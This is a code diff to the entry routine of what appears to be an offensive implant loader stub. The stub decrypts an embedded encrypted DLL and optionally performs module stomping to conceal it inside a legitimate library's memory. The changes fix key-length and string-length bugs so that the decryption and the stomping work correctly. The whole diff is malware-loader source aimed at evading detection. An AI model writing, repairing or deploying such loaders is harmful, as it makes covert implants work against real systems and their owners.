@@ -59,7 +59,13 @@ SEC( text, B ) VOID Entry( VOID )
         KaynLibraryLdr = C_PTR( stubBase + gDllOffset );
 
         // Decode BEFORE reading any PE fields — everything is ciphertext.
-        CryptDecodeBuffer( KaynLibraryLdr, ( DWORD ) gDllSize, gCryptKey, CRYPT_KEY_LEN - 1 );
+        // Key length = actual key chars, NOT CRYPT_KEY_LEN-1: the Go encoder
+        // hashes only the key bytes, so including the NUL terminator here
+        // would produce a different FNV seed and garbage output.
+        SIZE_T KeyLen = 0;
+        while ( KeyLen < CRYPT_KEY_LEN - 1 && gCryptKey[ KeyLen ] != 0 )
+            KeyLen++;
+        CryptDecodeBuffer( KaynLibraryLdr, ( DWORD ) gDllSize, gCryptKey, KeyLen );
     }
     else
     {
@@ -84,9 +90,14 @@ SEC( text, B ) VOID Entry( VOID )
     if ( gStompEnabled == 1 )
     {
         U_STRING StompName = { 0 };
+        USHORT   StompNameLen = 0;
+
+        // compute the actual string length in WCHARs (not the buffer size)
+        while ( StompNameLen < STOMP_TARGET_LEN && gStompTarget[ StompNameLen ] != 0 )
+            StompNameLen++;
 
         StompName.Buffer        = gStompTarget;
-        StompName.Length        = ( USHORT )( STOMP_TARGET_LEN - 1 ) * sizeof( WCHAR );
+        StompName.Length        = StompNameLen * sizeof( WCHAR );
         StompName.MaximumLength = ( USHORT )( STOMP_TARGET_LEN ) * sizeof( WCHAR );
         if ( ! NT_SUCCESS( Instance.Win32.LdrGetDllHandle( NULL, NULL, &StompName, &StompBase ) ) )
             Instance.Win32.LdrLoadDll( NULL, NULL, &StompName, &StompBase );
